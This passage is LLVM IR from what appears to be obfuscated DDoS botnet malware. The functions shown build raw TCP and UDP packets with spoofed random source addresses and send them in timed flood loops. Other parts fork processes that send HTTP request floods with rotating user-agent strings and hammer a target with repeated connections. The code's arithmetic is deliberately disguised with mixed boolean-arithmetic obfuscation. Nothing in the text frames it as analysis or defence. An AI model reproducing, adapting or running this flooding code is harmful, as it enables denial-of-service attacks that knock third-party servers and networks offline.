  %138 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %137, i32 0, i32 2
  store i16 %134, i16* %138, align 2
  %139 = call i32 @rand_cmwc()
  %140 = trunc i32 %139 to i16
  %141 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %142 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %141, i32 0, i32 0
  %143 = bitcast %union.anon.2* %142 to %struct.anon.3*
  %144 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %143, i32 0, i32 0
  store i16 %140, i16* %144, align 2
  %145 = load i32, i32* %8, align 4
  %146 = icmp eq i32 %145, 0
  br i1 %146, label %147, label %149

; <label>:147:                                    ; preds = %80
  %148 = call i32 @rand_cmwc()
  br label %154

; <label>:149:                                    ; preds = %80
  %150 = load i32, i32* %8, align 4
  %151 = trunc i32 %150 to i16
  %152 = call zeroext i16 @htons(i16 zeroext %151) #13
  %153 = zext i16 %152 to i32
  br label %154

; <label>:154:                                    ; preds = %149, %147
  %155 = phi i32 [ %148, %147 ], [ %153, %149 ]
  %156 = trunc i32 %155 to i16
  %157 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %158 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %157, i32 0, i32 0
  %159 = bitcast %union.anon.2* %158 to %struct.anon.3*
  %160 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %159, i32 0, i32 1
  store i16 %156, i16* %160, align 2
  %161 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %162 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %161, i32 0, i32 0
  %163 = bitcast %union.anon.2* %162 to %struct.anon.3*
  %164 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %163, i32 0, i32 3
  store i16 0, i16* %164, align 2
  %165 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %166 = bitcast %struct.udphdr* %165 to i8*
  %167 = getelementptr inbounds i8, i8* %166, i64 8
  %168 = load i32, i32* %10, align 4
  call void @makeRandomStr(i8* %167, i32 %168)
  %169 = bitcast i8* %108 to i16*
  %170 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 2
  %172 = load i16, i16* %171, align 2
  %173 = zext i16 %172 to i32
  %174 = call zeroext i16 @csum(i16* %169, i32 %173)
  %175 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 7
  store i16 %174, i16* %176, align 2
  %177 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %178 = load i32, i32* %9, align 4
  %179 = sub i32 0, %178
  %180 = sub i32 %177, %179
  %181 = add nsw i32 %177, %178
  store i32 %180, i32* %22, align 4
  store i32 0, i32* %23, align 4
  br label %182

; <label>:182:                                    ; preds = %235, %234, %154
  br label %183

; <label>:183:                                    ; preds = %182
  %184 = load i32, i32* %15, align 4
  %185 = bitcast %struct.sockaddr_in* %13 to %struct.sockaddr*
  %186 = call i64 @sendto(i32 %184, i8* %108, i64 %105, i32 0, %struct.sockaddr* %185, i32 16)
  %187 = call i32 @rand_cmwc()
  %188 = trunc i32 %187 to i16
  %189 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %190 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %189, i32 0, i32 0
  %191 = bitcast %union.anon.2* %190 to %struct.anon.3*
  %192 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %191, i32 0, i32 0
  store i16 %188, i16* %192, align 2
  %193 = load i32, i32* %8, align 4
  %194 = icmp eq i32 %193, 0
  br i1 %194, label %195, label %197

; <label>:195:                                    ; preds = %183
  %196 = call i32 @rand_cmwc()
  br label %202

; <label>:197:                                    ; preds = %183
  %198 = load i32, i32* %8, align 4
  %199 = trunc i32 %198 to i16
  %200 = call zeroext i16 @htons(i16 zeroext %199) #13
  %201 = zext i16 %200 to i32
  br label %202

; <label>:202:                                    ; preds = %197, %195
  %203 = phi i32 [ %196, %195 ], [ %201, %197 ]
  %204 = trunc i32 %203 to i16
  %205 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %206 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %205, i32 0, i32 0
  %207 = bitcast %union.anon.2* %206 to %struct.anon.3*
  %208 = getelementptr inbounds %struct.anon.3, %struct.anon.3* %207, i32 0, i32 1
  store i16 %204, i16* %208, align 2
  %209 = call i32 @rand_cmwc()
  %210 = trunc i32 %209 to i16
  %211 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %212 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %211, i32 0, i32 3
  store i16 %210, i16* %212, align 4
  %213 = load i32, i32* %18, align 4
  %214 = call i32 @getRandomIP(i32 %213)
  %215 = call i32 @htonl(i32 %214) #13
  %216 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %217 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %216, i32 0, i32 8
  store i32 %215, i32* %217, align 4
  %218 = bitcast i8* %108 to i16*
  %219 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %220 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %219, i32 0, i32 2
  %221 = load i16, i16* %220, align 2
  %222 = zext i16 %221 to i32
  %223 = call zeroext i16 @csum(i16* %218, i32 %222)
  %224 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %225 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %224, i32 0, i32 7
  store i16 %223, i16* %225, align 2
  %226 = load i32, i32* %23, align 4
  %227 = load i32, i32* %14, align 4
  %228 = icmp eq i32 %226, %227
  br i1 %228, label %229, label %235

; <label>:229:                                    ; preds = %202
  %230 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %231 = load i32, i32* %22, align 4
  %232 = icmp sgt i32 %230, %231
  br i1 %232, label %233, label %234

; <label>:233:                                    ; preds = %229
  br label %240

; <label>:234:                                    ; preds = %229
  store i32 0, i32* %23, align 4
  br label %182

; <label>:235:                                    ; preds = %202
  %236 = load i32, i32* %23, align 4
  %237 = sub i32 0, 1
  %238 = sub i32 %236, %237
  %239 = add i32 %236, 1
  store i32 %238, i32* %23, align 4
  br label %182

; <label>:240:                                    ; preds = %233
  %241 = load i8*, i8** %19, align 8
  call void @llvm.stackrestore(i8* %241)
  br label %242

; <label>:242:                                    ; preds = %240, %55, %49, %41
  ret void
}

; Function Attrs: nounwind
declare void @srand(i32) #4

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #8

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i16, align 2
  %6 = alloca %struct.hostent*, align 8
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i16 %1, i16* %5, align 2
  store i32 1, i32* %8, align 4
  %10 = load i8*, i8** %4, align 8
  %11 = call %struct.hostent* @gethostbyname(i8* %10)
  store %struct.hostent* %11, %struct.hostent** %6, align 8
  %12 = icmp eq %struct.hostent* %11, null
  br i1 %12, label %13, label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %45

; <label>:14:                                     ; preds = %2
  %15 = load %struct.hostent*, %struct.hostent** %6, align 8
  %16 = getelementptr inbounds %struct.hostent, %struct.hostent* %15, i32 0, i32 4
  %17 = load i8**, i8*** %16, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 0
  %19 = load i8*, i8** %18, align 8
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %21 = bitcast %struct.in_addr* %20 to i8*
  %22 = load %struct.hostent*, %struct.hostent** %6, align 8
  %23 = getelementptr inbounds %struct.hostent, %struct.hostent* %22, i32 0, i32 3
  %24 = load i32, i32* %23, align 4
  %25 = sext i32 %24 to i64
  call void @bcopy(i8* %19, i8* %21, i64 %25) #2
  %26 = load i16, i16* %5, align 2
  %27 = call zeroext i16 @htons(i16 zeroext %26) #13
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i16 %27, i16* %28, align 2
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i16 2, i16* %29, align 4
  %30 = call i32 @socket(i32 2, i32 1, i32 6) #2
  store i32 %30, i32* %9, align 4
  %31 = load i32, i32* %9, align 4
  %32 = bitcast i32* %8 to i8*
  %33 = call i32 @setsockopt(i32 %31, i32 6, i32 1, i8* %32, i32 4) #2
  %34 = load i32, i32* %9, align 4
  %35 = icmp eq i32 %34, -1
  br i1 %35, label %36, label %37

; <label>:36:                                     ; preds = %14
  store i32 0, i32* %3, align 4
  br label %45

; <label>:37:                                     ; preds = %14
  %38 = load i32, i32* %9, align 4
  %39 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %40 = call i32 @connect(i32 %38, %struct.sockaddr* %39, i32 16)
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %42, label %43

; <label>:42:                                     ; preds = %37
  store i32 0, i32* %3, align 4
  br label %45

; <label>:43:                                     ; preds = %37
  %44 = load i32, i32* %9, align 4
  store i32 %44, i32* %3, align 4
  br label %45

; <label>:45:                                     ; preds = %43, %42, %36, %13
  %46 = load i32, i32* %3, align 4
  ret i32 %46
}

declare %struct.hostent* @gethostbyname(i8*) #3

; Function Attrs: nounwind
declare void @bcopy(i8*, i8*, i64) #4

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) #0 {
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i16, align 2
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca [512 x i8], align 16
  %18 = alloca [1 x i8], align 1
  store i8* %0, i8** %7, align 8
  store i8* %1, i8** %8, align 8
  store i16 %2, i16* %9, align 2
  store i8* %3, i8** %10, align 8
  store i32 %4, i32* %11, align 4
  store i32 %5, i32* %12, align 4
  %19 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %20 = load i32, i32* %11, align 4
  %21 = sub i32 0, %19
  %22 = sub i32 0, %20
  %23 = add i32 %21, %22
  %24 = sub i32 0, %23
  %25 = add nsw i32 %19, %20
  store i32 %24, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %14, align 4
  br label %26

; <label>:26:                                     ; preds = %68, %6
  %27 = load i32, i32* %14, align 4
  %28 = load i32, i32* %12, align 4
  %29 = icmp slt i32 %27, %28
  br i1 %29, label %30, label %75

; <label>:30:                                     ; preds = %26
  %31 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %32 = load i8*, i8** %7, align 8
  %33 = load i8*, i8** %10, align 8
  %34 = load i8*, i8** %8, align 8
  %35 = call i32 @rand() #2
  %36 = srem i32 %35, 36
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds [36 x i8*], [36 x i8*]* @uastrings, i64 0, i64 %37
  %39 = load i8*, i8** %38, align 8
  %40 = call i32 (i8*, i8*, ...) @sprintf(i8* %31, i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.82, i32 0, i32 0), i8* %32, i8* %33, i8* %34, i8* %39) #2
  %41 = call i32 @fork() #2
  %42 = icmp ne i32 %41, 0
  br i1 %42, label %43, label %67

; <label>:43:                                     ; preds = %30
  br label %44

; <label>:44:                                     ; preds = %65, %43
  %45 = load i32, i32* %15, align 4
  %46 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %47 = icmp sgt i32 %45, %46
  br i1 %47, label %48, label %66

; <label>:48:                                     ; preds = %44
  %49 = load i8*, i8** %8, align 8
  %50 = load i16, i16* %9, align 2
  %51 = call i32 @socket_connect(i8* %49, i16 zeroext %50)
  store i32 %51, i32* %13, align 4
  %52 = load i32, i32* %13, align 4
  %53 = icmp ne i32 %52, 0
  br i1 %53, label %54, label %65

; <label>:54:                                     ; preds = %48
  %55 = load i32, i32* %13, align 4
  %56 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %57 = getelementptr inbounds [512 x i8], [512 x i8]* %17, i32 0, i32 0
  %58 = call i64 @strlen(i8* %57) #10
  %59 = call i64 @write(i32 %55, i8* %56, i64 %58)
  %60 = load i32, i32* %13, align 4
  %61 = getelementptr inbounds [1 x i8], [1 x i8]* %18, i32 0, i32 0
  %62 = call i64 @read(i32 %60, i8* %61, i64 1)
  %63 = load i32, i32* %13, align 4
  %64 = call i32 @close(i32 %63)
  br label %65

; <label>:65:                                     ; preds = %54, %48
  br label %44

; <label>:66:                                     ; preds = %44
  call void @exit(i32 0) #14
  unreachable

; <label>:67:                                     ; preds = %30
  br label %68

; <label>:68:                                     ; preds = %67
  %69 = load i32, i32* %14, align 4
  %70 = sub i32 0, %69
  %71 = sub i32 0, 1
  %72 = add i32 %70, %71
  %73 = sub i32 0, %72
  %74 = add nsw i32 %69, 1
  store i32 %73, i32* %14, align 4
  br label %26

; <label>:75:                                     ; preds = %26
  ret void
}

; Function Attrs: nounwind
declare i32 @sprintf(i8*, i8*, ...) #4

; Function Attrs: noreturn nounwind
declare void @exit(i32) #9

; Function Attrs: noinline nounwind uwtable
define void @sendCNC(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %10 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %11 = load i32, i32* %6, align 4
  %12 = sub i32 %10, -1431260343
  %13 = add i32 %12, %11
  %14 = add i32 %13, -1431260343
  %15 = add nsw i32 %10, %11
  store i32 %14, i32* %7, align 4
  %16 = load i8*, i8** %4, align 8
  %17 = call i32 @inet_addr(i8* %16) #2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %19 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %18, i32 0, i32 0
  store i32 %17, i32* %19, align 4
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %20, align 4
  %21 = load i32, i32* %5, align 4
  %22 = trunc i32 %21 to i16
  %23 = call zeroext i16 @htons(i16 zeroext %22) #13
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %23, i16* %24, align 2
  br label %25

; <label>:25:                                     ; preds = %29, %3
  %26 = load i32, i32* %7, align 4
  %27 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %28 = icmp sgt i32 %26, %27
  br i1 %28, label %29, label %37

; <label>:29:                                     ; preds = %25
  %30 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %30, i32* %8, align 4
  %31 = load i32, i32* %8, align 4
  %32 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %33 = call i32 @connect(i32 %31, %struct.sockaddr* %32, i32 16)
  %34 = call i32 @sleep(i32 1)
  %35 = load i32, i32* %8, align 4
  %36 = call i32 @close(i32 %35)
  br label %25

; <label>:37:                                     ; preds = %25
  ret void
}

declare i32 @sleep(i32) #3

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i8*, i32, i32, i32) #0 {
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca %struct.sockaddr_in, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i8*, align 8
  %21 = alloca %struct.iphdr*, align 8
  %22 = alloca %struct.tcphdr*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i8* %0, i8** %8, align 8
  store i32 %1, i32* %9, align 4
  store i32 %2, i32* %10, align 4
  store i8* %3, i8** %11, align 8
  store i32 %4, i32* %12, align 4
  store i32 %5, i32* %13, align 4
  store i32 %6, i32* %14, align 4
  %26 = load i32, i32* %13, align 4
  store i32 %26, i32* %15, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 0
  store i16 2, i16* %27, align 4
  %28 = load i32, i32* %9, align 4
  %29 = icmp eq i32 %28, 0
  br i1 %29, label %30, label %34

; <label>:30:                                     ; preds = %7
  %31 = call i32 @rand_cmwc()
  %32 = trunc i32 %31 to i16
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %32, i16* %33, align 2
  br label %39

; <label>:34:                                     ; preds = %7
  %35 = load i32, i32* %9, align 4
  %36 = trunc i32 %35 to i16
  %37 = call zeroext i16 @htons(i16 zeroext %36) #13
  %38 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 1
  store i16 %37, i16* %38, align 2
  br label %39

; <label>:39:                                     ; preds = %34, %30
  %40 = load i8*, i8** %8, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  br i1 %43, label %44, label %45

; <label>:44:                                     ; preds = %39
  br label %547

; <label>:45:                                     ; preds = %39
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 3
  %47 = getelementptr inbounds [8 x i8], [8 x i8]* %46, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %47, i8 0, i64 8, i32 4, i1 false)
  %48 = call i32 @socket(i32 2, i32 3, i32 6) #2
  store i32 %48, i32* %17, align 4
  %49 = load i32, i32* %17, align 4
  %50 = icmp ne i32 %49, 0
  br i1 %50, label %52, label %51

; <label>:51:                                     ; preds = %45
  br label %547

; <label>:52:                                     ; preds = %45
  store i32 1, i32* %18, align 4
  %53 = load i32, i32* %17, align 4
  %54 = bitcast i32* %18 to i8*
  %55 = call i32 @setsockopt(i32 %53, i32 0, i32 3, i8* %54, i32 4) #2
  %56 = icmp slt i32 %55, 0
  br i1 %56, label %57, label %58

; <label>:57:                                     ; preds = %52
  br label %547

; <label>:58:                                     ; preds = %52
  %59 = load i32, i32* %14, align 4
  %60 = icmp eq i32 %59, 0
  br i1 %60, label %61, label %62

; <label>:61:                                     ; preds = %58
  store i32 0, i32* %19, align 4
  br label %84

; <label>:62:                                     ; preds = %58
  %63 = load i32, i32* %14, align 4
  %64 = add i32 32, -1885023723
  %65 = sub i32 %64, %63
  %66 = sub i32 %65, -1885023723
  %67 = sub nsw i32 32, %63
  %68 = shl i32 1, %66
  %69 = add i32 %68, -1424810515
  %70 = sub i32 %69, 1
  %71 = sub i32 %70, -1424810515
  %72 = sub nsw i32 %68, 1
  %73 = xor i32 %71, -1
  %74 = and i32 -1505920696, %73
  %75 = xor i32 -1505920696, -1
  %76 = and i32 %71, %75
  %77 = xor i32 -1, -1
  %78 = and i32 %77, -1505920696
  %79 = and i32 -1, %75
  %80 = or i32 %74, %76
  %81 = or i32 %78, %79
  %82 = xor i32 %80, %81
  %83 = xor i32 %71, -1
  store i32 %82, i32* %19, align 4
  br label %84

; <label>:84:                                     ; preds = %62, %61
  %85 = load i32, i32* %12, align 4
  %86 = sext i32 %85 to i64
  %87 = sub i64 0, 40
  %88 = sub i64 0, %86
  %89 = add i64 %87, %88
  %90 = sub i64 0, %89
  %91 = add i64 40, %86
  %92 = call i8* @llvm.stacksave()
  store i8* %92, i8** %20, align 8
  %93 = alloca i8, i64 %90, align 16
  %94 = bitcast i8* %93 to %struct.iphdr*
  store %struct.iphdr* %94, %struct.iphdr** %21, align 8
  %95 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %96 = bitcast %struct.iphdr* %95 to i8*
  %97 = getelementptr i8, i8* %96, i64 20
  %98 = bitcast i8* %97 to %struct.tcphdr*
  store %struct.tcphdr* %98, %struct.tcphdr** %22, align 8
  %99 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %100 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %16, i32 0, i32 2
  %101 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %100, i32 0, i32 0
  %102 = load i32, i32* %101, align 4
  %103 = load i32, i32* %19, align 4
  %104 = call i32 @getRandomIP(i32 %103)
  %105 = call i32 @htonl(i32 %104) #13
  %106 = load i32, i32* %12, align 4
  %107 = sext i32 %106 to i64
  %108 = sub i64 0, %107
  %109 = sub i64 20, %108
  %110 = add i64 20, %107
  %111 = trunc i64 %109 to i32
  call void @makeIPPacket(%struct.iphdr* %99, i32 %102, i32 %105, i8 zeroext 6, i32 %111)
  %112 = call i32 @rand_cmwc()
  %113 = trunc i32 %112 to i16
  %114 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %115 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %114, i32 0, i32 0
  %116 = bitcast %union.anon.0* %115 to %struct.anon.1*
  %117 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %116, i32 0, i32 0
  store i16 %113, i16* %117, align 4
  %118 = call i32 @rand_cmwc()
  %119 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %120 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %119, i32 0, i32 0
  %121 = bitcast %union.anon.0* %120 to %struct.anon.1*
  %122 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %121, i32 0, i32 2
  store i32 %118, i32* %122, align 4
  %123 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %124 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %123, i32 0, i32 0
  %125 = bitcast %union.anon.0* %124 to %struct.anon.1*
  %126 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %125, i32 0, i32 3
  store i32 0, i32* %126, align 4
  %127 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %128 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %127, i32 0, i32 0
  %129 = bitcast %union.anon.0* %128 to %struct.anon.1*
  %130 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %129, i32 0, i32 4
  %131 = load i16, i16* %130, align 4
  %132 = xor i16 %131, -1
  %133 = xor i16 -241, -1
  %134 = xor i16 -15629, -1
  %135 = or i16 %132, %133
  %136 = or i16 -15629, %134
  %137 = xor i16 %135, -1
  %138 = and i16 %137, %136
  %139 = and i16 %131, -241
  %140 = and i16 %138, 80
  %141 = xor i16 %138, 80
  %142 = or i16 %140, %141
  %143 = or i16 %138, 80
  store i16 %142, i16* %130, align 4
  %144 = load i8*, i8** %11, align 8
  %145 = call i32 @strcmp(i8* %144, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.83, i32 0, i32 0)) #10
  %146 = icmp ne i32 %145, 0
  br i1 %146, label %269, label %147

; <label>:147:                                    ; preds = %84
  %148 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %149 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %148, i32 0, i32 0
  %150 = bitcast %union.anon.0* %149 to %struct.anon.1*
  %151 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %150, i32 0, i32 4
  %152 = load i16, i16* %151, align 4
  %153 = xor i16 %152, -1
  %154 = xor i16 -513, -1
  %155 = xor i16 -14246, -1
  %156 = or i16 %153, %154
  %157 = or i16 -14246, %155
  %158 = xor i16 %156, -1
  %159 = and i16 %158, %157
  %160 = and i16 %152, -513
  %161 = and i16 %159, 512
  %162 = xor i16 %159, 512
  %163 = or i16 %161, %162
  %164 = or i16 %159, 512
  store i16 %163, i16* %151, align 4
  %165 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %166 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %165, i32 0, i32 0
  %167 = bitcast %union.anon.0* %166 to %struct.anon.1*
  %168 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %167, i32 0, i32 4
  %169 = load i16, i16* %168, align 4
  %170 = xor i16 %169, -1
  %171 = xor i16 -1025, -1
  %172 = xor i16 -21675, -1
  %173 = or i16 %170, %171
  %174 = or i16 -21675, %172
  %175 = xor i16 %173, -1
  %176 = and i16 %175, %174
  %177 = and i16 %169, -1025
  %178 = xor i16 %176, -1
  %179 = xor i16 1024, -1
  %180 = xor i16 -27012, -1
  %181 = and i16 %178, -27012
  %182 = and i16 %176, %180
  %183 = and i16 %179, -27012
  %184 = and i16 1024, %180
  %185 = or i16 %181, %182
  %186 = or i16 %183, %184
  %187 = xor i16 %185, %186
  %188 = or i16 %178, %179
  %189 = xor i16 %188, -1
  %190 = or i16 -27012, %180
  %191 = and i16 %189, %190
  %192 = or i16 %187, %191
  %193 = or i16 %176, 1024
  store i16 %192, i16* %168, align 4
  %194 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %195 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %194, i32 0, i32 0
  %196 = bitcast %union.anon.0* %195 to %struct.anon.1*
  %197 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %196, i32 0, i32 4
  %198 = load i16, i16* %197, align 4
  %199 = xor i16 %198, -1
  %200 = xor i16 -257, -1
  %201 = xor i16 -26962, -1
  %202 = or i16 %199, %200
  %203 = or i16 -26962, %201
  %204 = xor i16 %202, -1
  %205 = and i16 %204, %203
  %206 = and i16 %198, -257
  %207 = xor i16 %205, -1
  %208 = xor i16 256, -1
  %209 = xor i16 -23044, -1
  %210 = and i16 %207, -23044
  %211 = and i16 %205, %209
  %212 = and i16 %208, -23044
  %213 = and i16 256, %209
  %214 = or i16 %210, %211
  %215 = or i16 %212, %213
  %216 = xor i16 %214, %215
  %217 = or i16 %207, %208
  %218 = xor i16 %217, -1
  %219 = or i16 -23044, %209
  %220 = and i16 %218, %219
  %221 = or i16 %216, %220
  %222 = or i16 %205, 256
  store i16 %221, i16* %197, align 4
  %223 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %224 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %223, i32 0, i32 0
  %225 = bitcast %union.anon.0* %224 to %struct.anon.1*
  %226 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %225, i32 0, i32 4
  %227 = load i16, i16* %226, align 4
  %228 = xor i16 %227, -1
  %229 = xor i16 -4097, -1
  %230 = xor i16 21764, -1
  %231 = or i16 %228, %229
  %232 = or i16 21764, %230
  %233 = xor i16 %231, -1
  %234 = and i16 %233, %232
  %235 = and i16 %227, -4097
  %236 = xor i16 %234, -1
  %237 = xor i16 4096, -1
  %238 = xor i16 26016, -1
  %239 = and i16 %236, 26016
  %240 = and i16 %234, %238
  %241 = and i16 %237, 26016
  %242 = and i16 4096, %238
  %243 = or i16 %239, %240
  %244 = or i16 %241, %242
  %245 = xor i16 %243, %244
  %246 = or i16 %236, %237
  %247 = xor i16 %246, -1
  %248 = or i16 26016, %238
  %249 = and i16 %247, %248
  %250 = or i16 %245, %249
  %251 = or i16 %234, 4096
  store i16 %250, i16* %226, align 4
  %252 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %253 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %252, i32 0, i32 0
  %254 = bitcast %union.anon.0* %253 to %struct.anon.1*
  %255 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %254, i32 0, i32 4
  %256 = load i16, i16* %255, align 4
  %257 = xor i16 %256, -1
  %258 = xor i16 -2049, -1
  %259 = xor i16 -25254, -1
  %260 = or i16 %257, %258
  %261 = or i16 -25254, %259
  %262 = xor i16 %260, -1
  %263 = and i16 %262, %261
  %264 = and i16 %256, -2049
  %265 = and i16 %263, 2048
  %266 = xor i16 %263, 2048
  %267 = or i16 %265, %266
  %268 = or i16 %263, 2048
  store i16 %267, i16* %255, align 4
  br label %433

; <label>:269:                                    ; preds = %84
  %270 = load i8*, i8** %11, align 8
  %271 = call i8* @strtok(i8* %270, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %271, i8** %23, align 8
  br label %272

; <label>:272:                                    ; preds = %430, %269
  %273 = load i8*, i8** %23, align 8
  %274 = icmp ne i8* %273, null
  br i1 %274, label %275, label %432

; <label>:275:                                    ; preds = %272
  %276 = load i8*, i8** %23, align 8
  %277 = call i32 @strcmp(i8* %276, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.85, i32 0, i32 0)) #10
  %278 = icmp ne i32 %277, 0
  br i1 %278, label %309, label %279

; <label>:279:                                    ; preds = %275
  %280 = load %struct.tcphdr*, %struct.tcphdr** %22, align 8
  %281 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %280, i32 0, i32 0
  %282 = bitcast %union.anon.0* %281 to %struct.anon.1*
  %283 = getelementptr inbounds %struct.anon.1, %struct.anon.1* %282, i32 0, i32 4
